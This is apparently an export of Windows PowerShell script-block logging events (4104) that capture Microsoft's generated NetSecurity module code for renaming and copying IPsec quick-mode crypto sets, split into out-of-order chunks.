    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${DisabledInterfaceAliases},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Enabled')) {
            [object]$__cmdletization_value = ${Enabled}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DefaultInboundAction')) {
            [object]$__cmdletization_value = ${DefaultInboundAction}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundPar

ScriptBlock ID: 4378949f-bc6c-45cd-8146-7e937d683352
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (6 of 6):
ame') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PerfectForwardSecrecyGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PerfectForwardSecrecyGroup})
        $__cmdletization_queryBuilder.FilterByProperty('PfsGroupID', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleQMCryptoSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewPolicyStore')) {
            [object]$__cmdletization_value = ${NewPolicyStore}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewGPOSession')) {
            [object]$__cmdletization_value = ${NewGPOSession}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('CloneObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecQuickModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Copy-NetIPsecQuickModeCryptoSet' -Alias '*'
        


ScriptBlock ID: c4a8740d-9bb5-4243-ac04-f86bbefea0d1
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (5 of 6):
ains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PerfectForwardSecrecyGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PerfectForwardSecrecyGroup})
        $__cmdletization_queryBuilder.FilterByProperty('PfsGroupID', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleQMCryptoSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecQuickModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetIPsecQuickModeCryptoSet' -Alias '*'
        

function Copy-NetIPsecQuickModeCryptoSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('PfsGroup')]
    [ValidateNotNull()]
    [Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup[]]
    ${PerfectForwardSecrecyGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewPolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewGPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayN

ScriptBlock ID: c4a8740d-9bb5-4243-ac04-f86bbefea0d1
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 6):

    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PerfectForwardSecrecyGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PerfectForwardSecrecyGroup})
        $__cmdletization_queryBuilder.FilterByProperty('PfsGroupID', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleQMCryptoSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
